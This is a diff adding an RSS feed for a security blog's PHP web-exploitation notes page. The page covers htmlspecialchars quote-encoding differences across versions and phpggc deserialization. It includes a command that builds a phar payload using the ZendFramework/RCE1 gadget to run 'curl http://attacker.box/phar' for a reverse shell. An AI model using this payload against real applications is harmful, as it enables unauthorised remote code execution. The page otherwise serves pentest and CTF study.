@@ -1,0 +1,36 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>fyx(me) – PHP Encoding Special Chars</title><link>https://fyx.me/tags/php-encoding-special-chars/</link><description>Recent content in PHP Encoding Special Chars on fyx(me)</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><atom:link href="https://fyx.me/tags/php-encoding-special-chars/index.xml" rel="self" type="application/rss+xml"/><item><title>PHP</title><link>https://fyx.me/bazaar/web-exploitation/php/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://fyx.me/bazaar/web-exploitation/php/</guid><description>
+&lt;h3>Online PHP runner with various PHP version&lt;span class="hx-absolute -hx-mt-20" id="online-php-runner-with-various-php-version">&lt;/span>
+&lt;a href="#online-php-runner-with-various-php-version" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;p>&lt;a href="https://onlinephp.io/" target="_blank" rel="noopener">https://onlinephp.io/&lt;/a>&lt;/p>
+&lt;h3>Dangerous functions&lt;span class="hx-absolute -hx-mt-20" id="dangerous-functions">&lt;/span>
+&lt;a href="#dangerous-functions" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;h4>htmlspecialchars&lt;span class="hx-absolute -hx-mt-20" id="htmlspecialchars">&lt;/span>
+&lt;a href="#htmlspecialchars" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h4>&lt;blockquote>
+&lt;p>htmlspecialchars — Convert special characters to HTML entities &lt;br>
+Ref: &lt;a href="https://www.php.net/manual/en/function.htmlspecialchars.php" target="_blank" rel="noopener">https://www.php.net/manual/en/function.htmlspecialchars.php&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>Depending on the php version, the defaults my be different and not encode all characters. For example &lt;code>' (single quote)&lt;/code> is not converted by default in all PHP versions:&lt;/p>
+&lt;p>
+&lt;figure>
+&lt;img src="../img/htmlspecialchars%20demo.png" title="HTML special chars demo with PHP v7.4.33 vs PHP v8.2.20" alt="HTML special chars demo with PHP v7.4.33 vs PHP v8.2.20" loading="lazy" />
+&lt;figcaption>HTML special chars demo with PHP v7.4.33 vs PHP v8.2.20&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;h3>Deserialization with &lt;a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc&lt;/a>&lt;span class="hx-absolute -hx-mt-20" id="deserialization-with-phpggchttpsgithubcomambionicsphpggc">&lt;/span>
+&lt;a href="#deserialization-with-phpggchttpsgithubcomambionicsphpggc" class="subheading-anchor" aria-label="Permalink for this section">&lt;/a>&lt;/h3>&lt;blockquote>
+&lt;p>PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.&lt;/p>
+&lt;/blockquote>
+&lt;p>If you need to find libraries used by the application, look for &lt;code>composer.json&lt;/code> or &lt;code>composer.lock&lt;/code>&lt;/p>
+&lt;div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+&lt;pre>&lt;code># show list of gadget chains
+./phpggc -l
+# deserialization via phar file
+# (phar doesnt care about the extension)
+# ZendFramework/RCE1 gadget selected here, but can be anything that supports __destruct or __wakeup vector
+./phpggc -p phar -o /tmp/revshell.anything ZendFramework/RCE1 system &amp;#34;curl http://attacker.box/phar&amp;#34;&lt;/code>&lt;/pre>&lt;div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+&lt;button
+class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+title="Copy code"
+>
+&lt;div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4">&lt;/div>
+&lt;/button>
+&lt;/div>
+&lt;/div></description></item></channel></rss>
